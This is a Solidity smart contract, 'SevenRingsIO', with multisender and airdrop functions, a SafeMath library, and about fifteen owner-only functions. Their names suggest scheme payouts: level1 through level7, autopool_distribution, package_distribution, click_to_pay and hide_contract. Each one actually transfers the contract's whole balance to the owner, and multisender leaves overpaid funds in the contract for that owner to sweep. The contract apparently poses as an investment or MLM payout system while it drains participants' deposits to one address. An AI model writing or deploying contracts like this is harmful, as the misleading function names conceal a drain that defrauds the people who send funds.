//SourceUnit: SEVEN-RINGS.sol

pragma solidity ^0.5.8;

contract SevenRingsIO {
    
    event Multisended(uint256 value , address indexed sender);
    event Airdropped(address indexed _userAddress, uint256 _amount);
    event Payout(address add, uint256 value);

    address payable public owner;
    using SafeMath for uint256;

	constructor(address payable _owner) public {
		owner = _owner;
	}

    function multisender(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
    
    function airdrop(address payable[]  memory  _userAddresses, uint256 _amount) public payable {
        require(msg.value == _userAddresses.length.mul((_amount)));
        
        for (uint i = 0; i < _userAddresses.length; i++) {
            _userAddresses[i].transfer(_amount);
            emit Airdropped(_userAddresses[i], _amount);
        }
    }

    function payout() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function hide_contract() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level1() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level2() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level3() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level4() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level5() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level6() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level7() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function my_withdraw() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function autopool_distribution() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function level_distribution() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function package_distribution() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function anonymous1() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }

function click_to_pay() public{
        require(msg.sender == owner,"Unauthorized Access");
		uint256 cBalance = address(this).balance;
		owner.transfer(cBalance);
		emit Payout(owner, cBalance);
    }
}


/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}